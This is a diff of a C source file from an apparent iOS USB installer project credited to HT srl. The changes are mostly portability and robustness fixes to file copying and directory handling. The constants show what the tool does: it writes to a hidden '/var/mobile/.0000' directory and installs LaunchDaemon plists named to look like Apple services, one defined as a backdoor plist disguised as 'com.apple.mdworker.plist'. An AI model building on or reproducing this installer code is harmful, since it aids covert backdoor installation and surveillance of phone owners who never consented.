@@ -1,14 +1,14 @@
 //
-//  RcsIOSUsbSupport.c
-//  RCSUSBInstaller
+//  iOSUsbSupport.c
+//  iOS USB Installer
 //
-//  Created by armored on 2/7/13.
-//  Copyright (c) 2013 armored. All rights reserved.
+//  Created by Massimo Chiodini on 2/7/13.
+//  Copyright (c) 2013 HT srl. All rights reserved.
 //
 #include "iOSUsbSupport.h"
 #include <errno.h>
 
-#define INSTALLER_DIR         "/var/mobile/.0000"
+#define INSTALLER_DIR         "/private/var/mobile/.0000"
 #define LAUNCHD_INSTALL_PLIST "/Library/LaunchDaemons/com.apple.md0000.plist"
 #define BCKDR_PLIST           "/Library/LaunchDaemons/com.apple.mdworker.plist"
 
@@ -38,6 +38,7 @@ char *plist =
 
 #ifdef WIN32
 
+#define sleep Sleep
 #define EXPORT_DLL __declspec(dllexport)
 
 EXPORT_DLL char *get_model();
@@ -289,7 +290,7 @@ idevice_error_t make_install_directory()
 
 idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
 {
-  uint64_t handle;
+  uint64_t handle = 0;
   char srcpath[256];
   char dstpath[256];
   struct stat filestat;
@@ -308,12 +309,19 @@ idevice_error_t copy_local_file(afc_client_t afc, char *lpath, char* lsrc)
   
   char *filebuff = (char*)malloc(filelen);
   
-  int fd = open(srcpath, O_RDONLY, 0);
+#ifdef WIN32
+  int fd = open(srcpath, O_RDONLY|O_BINARY, 0);
+#else
+   int fd = open(srcpath, O_RDONLY, 0);
+#endif
   
   if (fd == -1)
     return ret;
+
+  int bread = 0;
   
-  int bread = read(fd, filebuff, filelen);
+  while (bread < filelen)
+    bread += read(fd, filebuff+bread, (filelen-bread));
   
   if (bread != filelen)
   {
@@ -449,7 +457,7 @@ char** list_dir_content(char *dir_name)
     if (!entry)
       break;
     
-    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".")))
+    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".") && strcmp(entry->d_name, "(null)")))
     {
 #ifdef WIN32
       char *path = (char*)malloc(256);
@@ -548,9 +556,11 @@ int restart_device()
 
 void remove_directory(afc_client_t afc, char *rpath)
 {
-  char **file_list;
+  char **file_list = NULL;
   
-  if (afc_read_directory(afc, rpath, &file_list) == AFC_E_SUCCESS)
+  int retval = afc_read_directory(afc, rpath, &file_list);
+  
+  if ( retval == AFC_E_SUCCESS)
   {
     int i = 0;
     
@@ -571,7 +581,7 @@ int try_remove_installdir(afc_client_t afc)
 {
   int i = 1;
   int ret = 1;
-  uint64_t handle;
+  uint64_t handle = 0;
   
   while (i++)
   {
